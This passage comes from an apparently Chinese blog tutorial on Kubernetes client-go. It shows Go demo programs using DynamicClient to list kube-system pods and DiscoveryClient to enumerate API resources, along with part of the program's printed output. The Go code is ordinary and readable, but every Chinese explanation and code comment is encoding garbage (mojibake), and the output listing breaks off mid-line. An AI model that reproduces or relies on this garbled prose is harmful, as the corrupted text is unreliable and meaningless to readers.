Listå†…éƒ¨ä½¿ç”¨RestClientä¸k8s APIServerè¿›è¡Œäº†äº¤äº’</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">1) clientset.CoreV1().Podsè¡¨ç¤ºè¯·æ±‚coreæ ¸å¿ƒèµ„æºç»„çš„v1èµ„æºç‰ˆæœ¬ä¸‹çš„Podèµ„æºå¯¹è±¡ï¼Œå…¶å†…éƒ¨è®¾ç½®äº†APIPathè¯·æ±‚çš„HTTPè·¯å¾„ï¼ŒGroupVersionè¯·æ±‚çš„èµ„æºç»„ã€èµ„æºç‰ˆæœ¬ï¼ŒNegotiatedSerializeræ•°æ®çš„ç¼–è§£ç å™¨ã€‚</span><br><span class="hljs-comment">2) Podså‡½æ•°æ˜¯ä¸€ä¸ªèµ„æºå¯¹è±¡æ¥å£ï¼Œç”¨äºPodèµ„æºå¯¹è±¡çš„ç®¡ç†ã€‚ä¾‹å¦‚ï¼Œå¯¹Podèµ„æºæ‰§è¡ŒCreateã€Updateã€Deleteã€Getã€Listã€Watchã€Patchç­‰æ“ä½œï¼Œè¿™äº›æ“ä½œå®é™…ä¸Šæ˜¯å¯¹RESTClientè¿›è¡Œäº†å°è£…ï¼Œå¯ä»¥è®¾ç½®é€‰é¡¹ï¼ˆå¦‚Limitã€TimeoutSecondsç­‰ï¼‰ã€‚</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">// 4. æ ¼å¼åŒ–è¾“å‡ºç»“æœ</span><br><span class="hljs-keyword">for</span> _, item := <span class="hljs-keyword">range</span> result.Items &#123;<br>fmt.Printf(<span class="hljs-string">&quot;namespace: %v, name: %v, status: %v\n&quot;</span>, item.Namespace, item.Name, item.Status.Phase)<br>&#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="DynamicClient"><a href="#DynamicClient" class="headerlink" title="DynamicClient"></a>DynamicClient</h2><p>DynamicClientæ˜¯ä¸€ç§åŠ¨æ€å®¢æˆ·ç«¯ï¼Œå®ƒå¯ä»¥å¯¹ä»»æ„Kubernetesèµ„æºè¿›è¡ŒRESTFulæ“ä½œï¼ŒåŒ…æ‹¬CRDè‡ªå®šä¹‰èµ„æºã€‚</p><p>DynamicClientä¸ClientSetæ“ä½œç±»ä¼¼ï¼ŒåŒæ ·å°è£…äº†RESTClientï¼ŒåŒæ ·æä¾›äº†Createã€Updateã€Deleteã€Getã€Listã€Watchã€Patchç­‰æ–¹æ³•ã€‚</p><p>DynamicClientä¸ClientSetæœ€å¤§çš„ä¸åŒä¹‹å¤„åœ¨äºï¼š</p><ul><li><p>ClientSetä»…èƒ½è®¿é—®Kubernetesè‡ªå¸¦çš„èµ„æºï¼ˆå³å®¢æˆ·ç«¯å‡ æ ¸å†…çš„èµ„æºï¼‰ï¼Œä¸èƒ½ç›´æ¥è®¿é—®CRDè‡ªå®šä¹‰èµ„æºã€‚ClientSetéœ€è¦é¢„å…ˆå®ç°æ¯ç§Resourceå’ŒVersionçš„æ“ä½œï¼Œå…¶å†…éƒ¨çš„æ•°æ®éƒ½æ˜¯ç»“æ„åŒ–æ•°æ®ï¼ˆå³å·²çŸ¥æ•°æ®ç»“æ„ï¼‰</p></li><li><p>DynamicClientå†…éƒ¨å®ç°äº†Unstructuredï¼Œç”¨äºå¤„ç†éç»“æ„åŒ–æ•°æ®ç»“æ„ï¼ˆå³æ— æ³•æå‰é¢„çŸ¥æ•°æ®ç»“æ„ï¼‰ï¼Œè¿™ä¹Ÿæ˜¯DynamicClientèƒ½å¤Ÿå¤„ç†CRDè‡ªå®šä¹‰èµ„æºçš„å…³é”®ã€‚</p></li></ul><p>DynamicClientçš„å¤„ç†è¿‡ç¨‹å°†Resourceï¼ˆä¾‹å¦‚PodListï¼‰è½¬åŒ–æˆUnstructuredç»“æ„ç±»å‹ï¼ŒKubernetesçš„æ‰€æœ‰Resourceéƒ½å¯ä»¥è½¬åŒ–ä¸ºè¯¥ç»“æ„ç±»å‹ã€‚å¤„ç†å®Œæˆåï¼Œå†å°†Unstructuredè½¬æ¢æˆPodListã€‚æ•´ä¸ªè¿‡ç¨‹ç±»ä¼¼äºGoè¯­è¨€çš„interface{}æ–­è¨€è½¬æ¢è¿‡ç¨‹ã€‚å¦å¤–ï¼ŒUnstructuredç»“æ„ç±»å‹æ˜¯é€šè¿‡map[string]interface{}è½¬æ¢çš„ã€‚</p><p>ä¸¤ä¸ªé‡è¦çš„çŸ¥è¯†ç‚¹ï¼š</p><ul><li>Object.runtimeï¼šKubernetesä¸­çš„æ‰€æœ‰èµ„æºå¯¹è±¡éƒ½å®ç°äº†è¿™ä¸ªæ¥å£ï¼Œå…¶ä¸­åŒ…å«DeepCopyObjectå’ŒGetObjectKindçš„æ–¹æ³•ï¼Œåˆ†åˆ«ç”¨äºå¯¹è±¡æ·±æ‹·è´å’Œè·å–å¯¹è±¡çš„å…·ä½“èµ„æºç±»å‹ã€‚</li><li>Unstructuredï¼šåŒ…å«map[string]interface{}ç±»å‹å­—æ®µï¼Œåœ¨å¤„ç†æ— æ³•é¢„çŸ¥ç»“æ„çš„æ•°æ®æ—¶ï¼Œå°†æ•°æ®å€¼å­˜å…¥interface{}ä¸­ï¼Œå¾…è¿è¡Œæ—¶åˆ©ç”¨åå°„åˆ¤æ–­ã€‚è¯¥ç»“æ„ä½“æä¾›äº†å¤§é‡çš„å·¥å…·æ–¹æ³•ï¼Œä¾¿äºå¤„ç†éç»“æ„åŒ–çš„æ•°æ®ã€‚</li></ul><p>demoç¤ºä¾‹ï¼šé€šè¿‡DynamicClientç¤ºä¾‹åˆ—å‡ºæŸä¸€å‘½åç©ºé—´ä¸‹çš„Podèµ„æºå¯¹è±¡</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;context&quot;</span><br><span class="hljs-string">&quot;fmt&quot;</span><br><br>corev1 <span class="hljs-string">&quot;k8s.io/api/core/v1&quot;</span><br>metav1 <span class="hljs-string">&quot;k8s.io/apimachinery/pkg/apis/meta/v1&quot;</span><br><span class="hljs-string">&quot;k8s.io/apimachinery/pkg/runtime&quot;</span><br><span class="hljs-string">&quot;k8s.io/apimachinery/pkg/runtime/schema&quot;</span><br><span class="hljs-string">&quot;k8s.io/client-go/dynamic&quot;</span><br><span class="hljs-string">&quot;k8s.io/client-go/tools/clientcmd&quot;</span><br>)<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">@Author: ningan</span><br><span class="hljs-comment">@Desc: è·å–kube-systemå‘½åç©ºé—´ä¸‹çš„Podåˆ—è¡¨</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">// 1. åŠ è½½é…ç½®æ–‡ä»¶ï¼Œç”Ÿæˆconfigå¯¹è±¡</span><br>config, err := clientcmd.BuildConfigFromFlags(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;/root/.kube/config&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(err.Error())<br>&#125;<br><br><span class="hljs-comment">// 2. é€šè¿‡kubeconfigé…ç½®ä¿¡æ¯å®ä¾‹åŒ–å®¢æˆ·ç«¯å¯¹è±¡ï¼Œè¿™é‡Œæ˜¯å®ä¾‹åŒ–åŠ¨æ€å®¢æˆ·ç«¯å¯¹è±¡ã€‚è¯¥å¯¹è±¡ç”¨äºç®¡ç†Kubernetesçš„æ‰€æœ‰Resourceçš„å®¢æˆ·ç«¯ï¼Œä¾‹å¦‚å¯¹Resourceæ‰§è¡ŒCreateã€Updateã€Deleteã€Getã€Listã€Watchã€Patchç­‰æ“ä½œã€‚</span><br>dynamicClient, err := dynamic.NewForConfig(config)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(err.Error())<br>&#125;<br><br><span class="hljs-comment">// 3. é…ç½®éœ€è¦è°ƒç”¨çš„GVR</span><br>gvr := schema.GroupVersionResource&#123;<br>Group:    <span class="hljs-string">&quot;&quot;</span>,<br>Version:  <span class="hljs-string">&quot;v1&quot;</span>,<br>Resource: <span class="hljs-string">&quot;pods&quot;</span>,<br>&#125;<br><br><span class="hljs-comment">// 4. å‘é€è¯·æ±‚ï¼Œå¹¶å¾—åˆ°è¿”å›ç»“æœ</span><br>unstructedObj, err := dynamicClient.<br>Resource(gvr).<br>Namespace(<span class="hljs-string">&quot;kube-system&quot;</span>).<br>List(context.TODO(), metav1.ListOptions&#123;&#125;)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(err.Error())<br>&#125;<br><br><span class="hljs-comment">// 5. unstructedObjè½¬åŒ–ä¸ºç»“æ„åŒ–æ•°æ®</span><br>podList := &amp;corev1.PodList&#123;&#125;<br>err = runtime.DefaultUnstructuredConverter.FromUnstructured(<br>unstructedObj.UnstructuredContent(),<br>podList,<br>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(err.Error())<br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">1) Resourceï¼šåŸºäºgvrç”Ÿæˆäº†ä¸€ä¸ªé’ˆå¯¹äºèµ„æºçš„å®¢æˆ·ç«¯ï¼Œä¹Ÿå¯ä»¥ç§°ä¹‹ä¸ºåŠ¨æ€èµ„æºå®¢æˆ·ç«¯ï¼ŒdynamicResourceClient</span><br><span class="hljs-comment">2) Namespaceï¼šæŒ‡å®šä¸€ä¸ªå¯æ“ä½œçš„å‘½åç©ºé—´ï¼ŒåŒæ—¶å®ƒæ˜¯dynamicResourceClientçš„æ–¹æ³•</span><br><span class="hljs-comment">3) Listï¼šé¦–å…ˆé€šè¿‡RESTClientè°ƒç”¨k8s APIServerçš„æ¥å£è¿”å›äº†Podçš„æ•°æ®ï¼Œè¿”å›çš„æ•°æ®æ ¼å¼æ˜¯äºŒè¿›åˆ¶çš„Jsonæ ¼å¼ï¼Œç„¶åé€šè¿‡ä¸€äº›åˆ—çš„è§£ææ–¹æ³•ï¼Œè½¬æ¢æˆunstructured.UnstructuredList</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">1) dynamicClient.Resource()å‡½æ•°ç”¨äºè®¾ç½®è¯·æ±‚çš„èµ„æºç»„ã€èµ„æºç‰ˆæœ¬ã€èµ„æºåç§°ã€‚</span><br><span class="hljs-comment">2) Namespaceå‡½æ•°ç”¨äºè®¾ç½®è¯·æ±‚çš„å‘½åç©ºé—´ã€‚</span><br><span class="hljs-comment">3) Listå‡½æ•°ç”¨æˆ·è·å–Podåˆ—è¡¨ï¼Œå¾—åˆ°çš„Podåˆ—è¡¨ä¸ºunstructured.UnstructuredListæŒ‡é’ˆç±»å‹</span><br><span class="hljs-comment">4) ç„¶åé€šè¿‡runtime.DefaultUnstructuredConverter.FromUnstructuredå‡½æ•°å°†unstructured.UnstructuredListè½¬æ¢ä¸ºPodListç±»å‹ã€‚</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">// 6. æ ¼å¼åŒ–è¾“å‡ºç»“æœ</span><br><span class="hljs-keyword">for</span> _, item := <span class="hljs-keyword">range</span> podList.Items &#123;<br>fmt.Printf(<span class="hljs-string">&quot;namespace: %v, name: %v, status: %v\n&quot;</span>, item.Namespace, item.Name, item.Status.Phase)<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="DiscoveryClient"><a href="#DiscoveryClient" class="headerlink" title="DiscoveryClient"></a>DiscoveryClient</h2><p>DiscoveryClientæ˜¯å‘ç°å®¢æˆ·ç«¯ï¼Œå®ƒä¸»è¦ç”¨äºå‘ç°Kubernetes API Serveræ‰€æ”¯æŒçš„èµ„æºç»„ã€èµ„æºç‰ˆæœ¬ã€èµ„æºä¿¡æ¯ã€‚</p><p>Kubernetes API Serveræ”¯æŒå¾ˆå¤šèµ„æºç»„ã€èµ„æºç‰ˆæœ¬ã€èµ„æºä¿¡æ¯ï¼Œå¼€å‘è€…å¯ä»¥é€šè¿‡DiscoveryClientè¿›è¡ŒæŸ¥çœ‹ã€‚</p><p>kuectlde api-versionså’Œapi-resourceså‘½ä»¤è¾“å‡ºä¹Ÿæ˜¯é€šè¿‡DiscoveryClientå®ç°çš„ã€‚å¦å¤–ï¼ŒDiscoveryClientä¹Ÿæ˜¯å­å•ŠRESTClientçš„åŸºç¡€ä¸Šè¿›è¡Œäº†å°è£…ã€‚</p><p>DiscoveryClienté™¤äº†å¯ä»¥å‘ç°Kubernetes API Serveræ‰€æ”¯æŒçš„èµ„æºç»„ã€èµ„æºç‰ˆæœ¬ã€èµ„æºä¿¡æ¯ï¼Œè¿˜å¯ä»¥å°†è¿™äº›ä¿¡æ¯å­˜å‚¨åˆ°æœ¬åœ°ï¼Œç”¨äºæœ¬åœ°ç¼“å­˜ï¼ˆcacheï¼‰ï¼Œä»¥å‡è½»å¯¹Kubernetes API Serverè®¿é—®çš„å‹åŠ›ã€‚åœ¨è¿è¡ŒKubernetesç»„ä»¶çš„æœºå™¨ä¸Šï¼Œç¼“å­˜ä¿¡æ¯é»˜è®¤å­˜å‚¨ä¸<del>&#x2F;.kube&#x2F;cacheå’Œ</del>&#x2F;.kube&#x2F;http-cacheä¸‹ã€‚</p><p>demoç¤ºä¾‹ï¼šé€šè¿‡DynamicClientåˆ—å‡ºKubernetes API Serveræ‰€æ”¯æŒçš„èµ„æºç»„ã€èµ„æºç‰ˆæœ¬ã€èµ„æºä¿¡æ¯</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-string">&quot;k8s.io/apimachinery/pkg/runtime/schema&quot;</span><br><span class="hljs-string">&quot;k8s.io/client-go/discovery&quot;</span><br><span class="hljs-string">&quot;k8s.io/client-go/tools/clientcmd&quot;</span><br>)<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">@Author: ningan</span><br><span class="hljs-comment">@Desc: é€šè¿‡DynamicClientåˆ—å‡ºKubernetes API Serveræ‰€æ”¯æŒçš„èµ„æºç»„ã€èµ„æºç‰ˆæœ¬ã€èµ„æºä¿¡æ¯</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">// 1. åŠ è½½é…ç½®æ–‡ä»¶ï¼Œç”Ÿæˆconfigå¯¹è±¡</span><br>config, err := clientcmd.BuildConfigFromFlags(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;/root/.kube/config&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(err.Error())<br>&#125;<br><br><span class="hljs-comment">// 2. é€šè¿‡kubeconfigé…ç½®ä¿¡æ¯å®ä¾‹åŒ–discoveryClientå¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡æ˜¯ç”¨äºå‘ç°Kubernetes API Serveræ‰€æ”¯æŒçš„èµ„æºç»„ã€èµ„æºç‰ˆæœ¬ã€èµ„æºä¿¡æ¯çš„å®¢æˆ·ç«¯ã€‚</span><br>discoveryClient, err := discovery.NewDiscoveryClientForConfig(config)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(err.Error())<br>&#125;<br><br><span class="hljs-comment">// 3. å‘é€è¯·æ±‚ï¼Œè·å–GVRæ•°æ®</span><br>_, apiResourcesList, err := discoveryClient.ServerGroupsAndResources()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(err.Error())<br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">1) ServerGroupsè´Ÿè´£è·å–gvæ•°æ®</span><br><span class="hljs-comment">2) ç„¶åè°ƒç”¨fetchGroupVersionResourcesï¼Œä¸”ç»™è¿™ä¸ªæ–¹æ³•ä¼ é€’gvå‚æ•°ï¼Œé€šè¿‡è°ƒç”¨ServerResourcesForGroupVersionæ–¹æ³•è·å–gvå¯¹åº”çš„Resourceæ•°æ®ï¼ŒåŒæ—¶è¿”å›ä¸€ä¸ªmap[gv]resourceListçš„æ•°æ®æ ¼å¼</span><br><span class="hljs-comment">3) å¤„ç†map-&gt;sliceï¼Œç„¶åè¿”å›GCR slice</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">Kubernetes API Serveræš´éœ²å‡º/apiå’Œ/apisæ¥å£ã€‚DiscoveryClienté€šè¿‡RESTClientåˆ†åˆ«è¯·æ±‚/apiå’Œ/apisæ¥å£ï¼Œä»è€Œè·å–Kubernetes API Serveræ‰€æ”¯æŒçš„èµ„æºç»„ã€èµ„æºç‰ˆæœ¬ã€èµ„æºä¿¡æ¯ã€‚æ ¸å¿ƒå®ç°ä½äºï¼šServerGroupsAndResources-&gt;ServerGroupsä¸­</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-keyword">for</span> _, list := <span class="hljs-keyword">range</span> apiResourcesList &#123;<br>gv, err := schema.ParseGroupVersion(list.GroupVersion)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(err.Error())<br>&#125;<br><br><span class="hljs-keyword">for</span> _, resource := <span class="hljs-keyword">range</span> list.APIResources &#123;<br>fmt.Printf(<span class="hljs-string">&quot;name: %v, group: %v, version: %v\n&quot;</span>, resource.Name, gv.Group, gv.Version)<br>&#125;<br>&#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@master demo1]<span class="hljs-comment"># go run main.go</span><br>name: bindings, group: , version: v1<br>name: componentstatuses, group: , version: v1<br>name: configmaps, group: , version: v1<br>name: endpoints, group: , version: v1<br>name: events, group: , version: v1<br>name: limitranges, group: , version: v1<br>name: namespaces, group: , version: v1<br>name: namespaces/finalize, group: , version: v1<br>name: namespaces/status, group: , version: v1<br>name: nodes, group: , version: v1<br>name: nodes/proxy, group: , version: v1<br>name: nodes/status, group: , version: v1<br>name: persistentvolumeclaims, group: , version: v1<br>name: persistentvolumeclaims/status, group: , version: v1<br>name: persistentvolumes, group: , version: v1<br>name: persistentvolumes/status, group: , version: v1<br>name: pods, group: , version: v1<br>name: pods/attach, group: , version: v1<br>name: pods/binding, group: , version: v1<br>name: pods/eviction, group: , version: v1<br>name: pods/exec, group: , version: v1<br>name: pods/log, group: , version: v1<br>name: pods/portforward, group: , version: v1<br>name: pods/proxy, group: , version: v1<br>name: pods/status, group: , version: v1<br>name: podtemplates, group: , version: v1<br>name: replicationcontrollers, group: , version: v1<br>name: replicationcontrollers/scale, group: , version: v1<br>name: replicationcontrollers/status, group: , version: v1<br>name: resourcequotas, group: , version: v1<br>name: resourcequotas/status, group: , version: v1<br>name: secrets, group: , version: v1<br>name: serviceaccounts, group: , version: v1<br>name: services, group: , version: v1<br>name: services/proxy, group: , version: v1<br>name: services/status, group: , version: v1<br>name: apiservices, group: apiregistration.k8s.io, version: v1<br>name: apiservices/status, group: apiregistration.k8s.io, version: v1<br>name: apiservices, group: apiregistration.k8s.io, version: v1beta1<br>name: apiservices/status, group: apiregistration.k8s.io, version: v1beta1<br>name: ingresses, group: extensions, version: v1beta1<br>name: ingresses/status, group: extensions, version: v1beta1<br>name: controllerrevisions, group: apps, version: v1<br>name: daemonsets, group: apps, version: v1<br>name: daemonsets/status, group: apps, version: v1<br>name: deployments, group: apps, version: v1<br>name: deployments/scale, group: apps, version: v1<br>name: deployments/status, group: apps, version: v1<br>name: replicasets, group: apps, version: v1<br>name: replicasets/scale, group: apps, version: v1<br>name: replicasets/status, group: apps, version: v1<br>name: statefulsets, group: apps, version: v1<br>name: statefulsets/scale, group: apps, version: v1<br>name: statefulsets/status, group: apps, version: v1<br>name: events, group: events.k8s.io, version: v1<br>name: events, group: events.k8s.io, version: v1beta1<br>name: tokenreviews, group: authentication.k8s.io, version: v1<br>name: tokenreviews, group: authentication.k8s.io, version: v1beta1<br>name: localsubjectaccessreviews, group: authorization.k8s.io, version: v1<br>name: selfsubjectaccessreviews, group: authorization.k8s.io, version: v1<br>name: selfsubjectrulesreviews, group: authorization.k8s.io, version: v1<br>name: subjectaccessreviews, group: authorization.k8s.io, version: v1<br>name: localsubjectaccessreviews, group: authorization.k8s.io, version: v1beta1<br>name: selfsubjectaccessreviews, group: authorization.k8s.io, version: v1beta1<br>name: selfsubjectrulesreviews, group: authorization.k8s.io, version: v1beta1<br>name: subjectaccessreviews, group: authorization.k8s.io, version: v1beta1<br>name: horizontalpodautoscalers, group: autoscaling, version: v1<br>name: horizontalpodautoscalers/status, group: autoscaling, version: v1<br>name: horizontalpodautoscalers, group: autoscaling, version: v2beta1<br>name: horizontalpodautoscalers/status, group: autoscaling, version: v2beta1<br>name: horizontalpodautoscalers, group: autoscaling, version: v2beta2<br>name: horizontalpodautoscalers/status, group: autoscaling, version: v2beta2<br>name: <span class="hljs-built_in">jobs</span>, group: batch, version: v1<br>name: <span class="hljs-built_in">jobs</span>/status, group: batch, version: v1<br>name: cronjobs, group: batch, version: v1beta1<br>name: cronjobs/status, group: batch, version: v1beta1<br>name: certificatesigningrequests, group: certificates.k8s.io, version: v1<br>name: certificatesigningrequests/approval, group: certificates.k8s.io, version: v1<br>name: certificatesigningrequests/status, group: certificates.k8s.io, version: v1<br>name: certificatesigningrequests, group: certificates.k8s.io, version: v1beta1<br>name: certificatesigningrequests/approval, group: certificates.k8s.io, version: v1beta1<br>name: certificatesigningrequests/status, group: certificates.k8s.io, version: v1beta1<br>name: ingressclasses, group: networking.k8s.io, version: v1<br>name: ingresses, group: networking.k8s.io, version: v1<br>name: ingresses/status, group: networking.k8s.io, version: v1<br>name: networkpolicies, group: networking.k8s.io, version: v1<br>name: ingressclasses, group: networking.k8s.io, version: v1beta1<br>name: ingresses, group: networking.k8s.io, version: v1beta1<br>name: ingresses/status, group: networking.k8s.io, version: v1beta1<br>name: poddisruptionbudgets, group: policy, version: v1beta1<br>name: poddisruptionbudgets/status, group: policy, version: v1beta1<br>name: podsecuritypolicies, group: policy, version: v1beta1<br>name: clusterrolebindings, group: rbac.authorization.k8s.io, version: v1<br>name: clusterroles, group: rbac.authorization.k8s.io, version: v1<br>name: rolebindings, group: rbac.authorization.k8s.io, version: v1<br>name: roles, group: rbac.authorization.k8s.io, version: v1<br>name: clusterrolebindings, group: rbac.authorization.k8s.io, version: v1beta1<br>name: clusterroles, group: rbac.authorization.k8s.io, version: v1beta1<br>name: rolebindings, group: rbac.authorization.k8s.io, version: v1beta1<br>name: roles, group: rbac.authorization.k8s.io, version: v1beta1<br>name: csidrivers, group: storage.k8s.io, version: v1<br>name: csinodes, group: storage.k8s.io, version: v1<br>name: storageclasses, group: storage.k8s.io, version: v1<br>name: volumeattachments, group: storage.k8s.io, version: v1<br>name: volumeattachments/status, group: storage.k8s.io, version: v1<br>name: csidrivers, group: storage.k8s.io, version: v1beta1<br>name: csinodes, group: storage.k8s.io, version: v1beta1<br>name: storageclasses, group: storage.k8s.io, version: v1beta1<br>name: volumeattachments, group: storage.k8s.io, version: v1beta1<br>name: mutatingwebhookconfigurations, group: admissionregistration.k8s.io, version: v1<br>name: validatingwebhookconfigurations, group: admissionregistration.k8s.io, version: v1<br>name: 